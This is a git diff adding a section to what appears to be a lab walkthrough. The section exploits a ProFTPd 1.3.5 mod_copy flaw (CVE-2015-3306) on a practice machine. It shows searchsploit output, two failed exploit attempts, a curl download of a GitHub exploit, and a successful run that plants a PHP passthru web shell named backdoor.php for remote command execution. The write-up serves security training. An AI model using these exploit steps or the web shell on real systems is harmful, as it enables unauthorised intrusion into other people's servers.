@@ -2262,3 +2262,99 @@ Note that we have some other configurations in this machine.
 1. The webroot is no longer /var/www/html. We have changed it to /var/www/tryingharderisjoy.
 2. I am trying to perform some simple bash scripting tutorials. Let me see how it turns out.
 ```
+
+# 4. Exploiting ProFTPd 1.3.5
+
+From the software versions listed in `version_control`, ProFTPd 1.3.5 appears to be a viable way in
+
+There are also a few RCEs on exploit-db:
+
+```console
+┌──(root㉿kali)-[~]
+└─# searchsploit ProFTPd 1.3.5
+------------------------------------------------------------- ---------------------------------
+ Exploit Title                                               |  Path
+------------------------------------------------------------- ---------------------------------
+ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)    | linux/remote/37262.rb
+ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution          | linux/remote/36803.py
+ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)      | linux/remote/49908.py
+ProFTPd 1.3.5 - File Copy                                    | linux/remote/36742.txt
+------------------------------------------------------------- ---------------------------------
+```
+
+The exploits, however, don't work:
+
+<details>
+  <summary><code>36803</code></summary>
+
+```console
+┌──(root㉿kali)-[~]
+└─# python 36803.py 10.0.88.34 /var/www/tryingharderisjoy whoami
+  ___        __        ____                 _    _
+ |_ _|_ __  / _| ___  / ___| ___ _ __      / \  | |
+  | || '_ \| |_ / _ \| |  _ / _ \ '_ \    / _ \ | |
+  | || | | |  _| (_) | |_| |  __/ | | |  / ___ \| |___
+ |___|_| |_|_|  \___/ \____|\___|_| |_| /_/   \_\_____|
+
+
+[ + ] Connected to server [ + ]
+
+Traceback (most recent call last):
+  File "/root/36803.py", line 30, in <module>
+    s.send('site cpfr /etc/passwd')
+TypeError: a bytes-like object is required, not 'str'
+```
+
+</details>
+
+<details>
+  <summary><code>49908</code></summary>
+
+```console
+┌──(root㉿kali)-[~]
+└─# python 49908.py 10.0.88.34
+220 The Good Tech Inc. FTP Server
+
+350 File or directory exists, ready for destination name
+
+250 Copy successful
+
+350 File or directory exists, ready for destination name
+
+250 Copy successful
+
+Exploit Completed
+[!] Something Went Wrong
+[!] Directory might not be writable
+```
+
+</details>
+
+Googling for the related CVE-2015-3306 returns a viable [exploit on GitHub](https://github.com/t0kx/exploit-CVE-2015-3306)
+
+☝️ exploit-db has an expansive collection, but it is not exhaustive
+
+**Important learning point**: if there's a CVE on a service and there doesn't seem to be any working exploits, try googling for for the CVE, it can sometimes turn up useful information
+
+The exploit uploads a RCE payload `<?php echo passthru($_GET['cmd']); ?>` on `backdoor.php` to the directory specified
+
+Coincidentally, we were informed by the  `version_control` document that the DocumentRoot is at `/var/www/tryingharderisjoy`
+
+```console
+┌──(root㉿kali)-[~]
+└─# curl -LO https://github.com/t0kx/exploit-CVE-2015-3306/raw/master/exploit.py
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+100  2050  100  2050    0     0  17956      0 --:--:-- --:--:-- --:--:-- 17956
+
+┌──(root㉿kali)-[~]
+└─# python3 exploit.py --host 10.0.88.34 --port 21 --path /var/www/tryingharderisjoy
+[+] CVE-2015-3306 exploit by t0kx
+[+] Exploiting 10.0.88.34:21
+[+] Target exploited, acessing shell at http://10.0.88.34/backdoor.php
+[+] Running whoami: www-data
+[+] Done
+```
+
+Well done, we now have RCE ability on the target as `www-data` user
